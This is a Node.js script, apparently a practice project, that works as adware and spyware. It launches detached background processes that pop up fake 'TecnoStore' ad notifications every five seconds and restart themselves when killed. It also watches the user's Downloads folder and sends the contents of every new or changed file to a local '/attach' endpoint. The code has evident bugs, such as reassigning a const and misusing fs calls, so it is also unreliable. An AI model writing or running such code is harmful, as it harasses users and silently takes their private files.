import notify from "node-notifier";
import chokidar from "chokidar";
import fs from "fs";
import path from "path";
import { spawn } from "child_process";
import os from "os";

import { fileURLToPath } from "url";
import { dirname } from "path";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// PATHS BASE
// const usuario = os.userInfo().username;

const home = os.homedir();
const baseDir = process.cwd(); // mejor para pkg
const spamPID = path.join(baseDir, "spam.pid");
const watchdogPID = path.join(baseDir, "watchdog.pid");
const carpetaWatch = path.join(baseDir, "prueba");
const MAX_SIZE = 1024 * 1024 * 2; // 2MB

// UTILIDADES PID

function procesoActivo(pidFile) {
  try {
    const pid = parseInt(fs.readFileSync(pidFile));
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function registrarPID(pidFile) {
  if (fs.existsSync(pidFile)) {
    try {
      const oldPid = parseInt(fs.readFileSync(pidFile));
      process.kill(oldPid, 0);
      console.log("Ya existe instancia, saliendo...");
      process.exit(0);
    } catch {
      fs.unlinkSync(pidFile);
    }
  }

  fs.writeFileSync(pidFile, process.pid.toString());

  process.on("exit", () => {
    try {
      fs.unlinkSync(pidFile);
    } catch {}
  });
  process.on("SIGINT", () => process.exit());
  process.on("SIGTERM", () => process.exit());
}

// SPAM

function iniciarSpam() {
  registrarPID(spamPID);

  const imagenRuta = path.join(baseDir, "asset", "image.png");

  console.log("Spam activo...");

  setInterval(() => {
    notify.notify({
      title: "Oferta Especial",
      message: "Nueva PC GAMER por 199.99 USD!",
      icon: imagenRuta,
      sound: true,
      appName: "TecnoStore",
    });
  }, 5000);
}

// WATCHDOG

function iniciarWatchdog() {
  registrarPID(watchdogPID);

  console.log("Watchdog activo...");
  const posibles = [path.join(home, "Downloads"), path.join(home, "Descargas")];
  for (const p of posibles) {
    if (fs.existsSync(p)) {
      carpetaWatch = p;
    }
  }

  // watcher
  const watcher = chokidar.watch(carpetaWatch, {
    ignoreInitial: true,
    depth: 99,
  });

  watcher
    .on("add", (file) => {
      console.log("[NUEVO]", file);
      procesarArchivo(file);
    })
    .on("change", (file) => {
      console.log("[CAMBIO]", file);
      procesarArchivo(file);
    })
    .on("unlink", (file) => {
      console.log("[BORRADO]", file);
    })
    .on("addDir", (dirPath) => {
      console.log(`[CARPETA] ${dirPath}`);
      procesarArchivo(dirPath);
    })
    .on("error", (error) => {
      console.error(`[WATCHER ERROR]`, error);
    });

  // vigilancia de spam
  setInterval(() => {
    if (!procesoActivo(spamPID)) {
      console.log("[RECOVERY] levantando spam...");

      const p = spawn(process.execPath, [__filename, "--spam"], {
        detached: true,
        stdio: "ignore",
      });

      p.unref();
    } else {
      console.log("[OK] spam activo");
    }
  }, 5000);
}

async function procesarArchivo(filePath) {
  try {
    const nombreArchivo = path.basename(filePath);
    const nombreCarpeta = path.basename(path.dirname(filePath));

    const stats = await fs.stat(filePath);

    if (stats.size > MAX_SIZE) {
      console.log(`[SKIP] Archivo muy grande: ${nombreArchivo}`);
      return;
    }

    const contenido = await fs.readFile(filePath, "utf-8");
    const data = {
      nombreCarpeta,
      nombreArchivo,
      contenido,
    };

    console.log(`[DATA] ${JSON.stringify(data)}`);

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    try {
      const res = await fetch("http://localhost:3000/attach", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ data }),
      });
    } catch (error) {
      if (error.name === "AbortError") {
        console.error(`[ERROR] Timeout al enviar ${filePath}`);
      } else {
        console.error(`[ERROR] al enviar ${filePath}:`, error.message);
      }
    } finally {
      clearTimeout(timeout);
    }

    if (!res.ok) {
      throw new Error(`HTTP ${res.status}`);
    }

    const result = await res.text();
    console.log("[SERVER]", result);
  } catch (error) {
    console.error(`[ERROR] procesando ${filePath}:`, error.message);
  }
}

// LAUNCHER
function iniciarSistema() {
  console.log("Iniciando sistema...");

  // iniciar watchdog primero
  if (!procesoActivo(watchdogPID)) {
    spawn(process.execPath, [__filename, "--watchdog"], {
      detached: true,
      stdio: "ignore",
    }).unref();

    console.log("Watchdog lanzado");
  }

  // iniciar spam
  if (!procesoActivo(spamPID)) {
    spawn(process.execPath, [__filename, "--spam"], {
      detached: true,
      stdio: "ignore",
    }).unref();

    console.log("Spam lanzado");
  }

  console.log("Sistema corriendo en background");
}

// ROUTER DE MODOS

if (process.argv.includes("--spam")) {
  iniciarSpam();
} else if (process.argv.includes("--watchdog")) {
  iniciarWatchdog();
} else {
  iniciarSistema();
}
